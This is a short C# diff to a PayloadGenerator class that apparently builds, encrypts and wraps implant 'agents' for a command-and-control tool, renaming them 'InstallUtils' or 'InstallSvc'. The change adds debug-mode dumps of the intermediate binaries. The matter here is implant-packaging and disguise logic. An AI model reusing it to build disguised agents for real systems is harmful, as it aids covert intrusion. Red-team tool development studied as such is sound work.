@@ -294,7 +294,8 @@ public partial class PayloadGenerator
             { "Key", options.ServerKey ?? String.Empty }
         });
 
-        //File.WriteAllBytes("/mnt/Share/tmp/justAgent.exe", agent);
+        if(options.IsDebug)
+            File.WriteAllBytes(Path.Combine(options.DebugPath,"BaseAgent.exe"), agent);
 
 
         this.MessageSent?.Invoke(this, $"Encrypting Agent...");
@@ -322,6 +323,8 @@ public partial class PayloadGenerator
                         { "Key", encAgent.Secret }
                     });
             var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
+            if (options.IsDebug)
+                File.WriteAllBytes(Path.Combine(options.DebugPath, "Starter.exe"), starter);
             return resultAgent;
         }
         else
@@ -337,6 +340,10 @@ public partial class PayloadGenerator
                         { "Key", encAgent.Secret }
                     });
             var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
+
+            if (options.IsDebug)
+                File.WriteAllBytes(Path.Combine(options.DebugPath, "ServiceAgent.exe"), agent);
+
             return resultAgent;
         }
     }
